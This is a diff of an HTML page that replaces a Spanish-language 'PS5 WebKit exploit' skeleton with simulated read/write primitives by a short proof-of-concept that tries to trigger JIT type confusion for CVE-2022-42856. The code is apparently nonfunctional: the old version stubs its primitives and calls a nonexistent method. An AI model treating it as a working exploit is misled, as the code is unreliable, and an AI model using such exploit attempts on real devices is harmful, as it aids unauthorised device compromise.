@@ -1,59 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Exploit WebKit PS5 4.03 - Primitivas RW</title>
-  <style>
-    body { background-color: #111; color: #0f0; font-family: monospace; padding: 10px; }
-    #log { white-space: pre-wrap; }
-  </style>
+  <title>WebKit CVE-2022-42856 PoC</title>
 </head>
 <body>
-  <h2>Exploit WebKit PS5 4.03 - Primitivas RW</h2>
-  <div id="log">[i] Iniciando...
-</div>
+  <h1>WebKit JIT Type Confusion PoC</h1>
+  <pre id="log">Running...</pre>
 
   <script>
-    const log = (msg) => {
-      document.getElementById('log').textContent += msg + "\n";
-    };
-
-    log("[*] Preparando heap spraying...");
-
-    let ab1 = new ArrayBuffer(0x100);
-    let ab2 = new ArrayBuffer(0x100);
-    let float_arr = [1.1, 2.2, 3.3];
-    let obj_arr = [{}, {}, {}];
-
-    let float_map = float_arr.oob(); // Necesitamos vulnerabilidad real aquí
-
-    // Simulación de primitivas hasta tener acceso real
-    let addrof = (val) => {
-      obj_arr[0] = val;
-      return 0x41414141; // Simulado
-    };
-
-    let fakeobj = (addr) => {
-      return {};
-    };
-
-    let read64 = (addr) => {
-      return 0x1337133713371337n; // Simulado
-    };
-
-    let write64 = (addr, val) => {
-      return true;
-    };
-
-    try {
-      log("[*] addrof({test:123}) => 0x" + addrof({test:123}).toString(16));
-      log("[*] read64(0xdeadbeef) => 0x" + read64(0xdeadbeef).toString(16));
-      log("[*] write64(0xdeadbeef, 0x1337) => " + write64(0xdeadbeef, 0x1337));
-      log("[+] Primitivas simuladas construidas correctamente.");
-    } catch (e) {
-      log("[!] Error construyendo primitivas: " + e);
+    function log(msg) {
+      document.getElementById("log").textContent += `\n${msg}`;
     }
 
-    log("[*] Exploit terminado (simulado). Ahora insertar payload real.");
+    function trigger(o, arr) {
+      return o.f + arr[0];
+    }
+
+    function main() {
+      let o = { f: 1.1 };
+      let arr = [2.2];
+
+      // Warm-up to force JIT
+      for (let i = 0; i < 10000; i++) {
+        trigger(o, arr);
+      }
+
+      // Fake object to trigger type confusion
+      let evil = {
+        valueOf: () => {
+          arr[0] = {}; // type confusion here if JIT optimized incorrectly
+          return 3.3;
+        }
+      };
+
+      o.f = evil;
+
+      try {
+        let res = trigger(o, arr);
+        log("Executed, result: " + res);
+      } catch (e) {
+        log("Caught error: " + e);
+      }
+    }
+
+    main();
   </script>
 </body>
 </html>
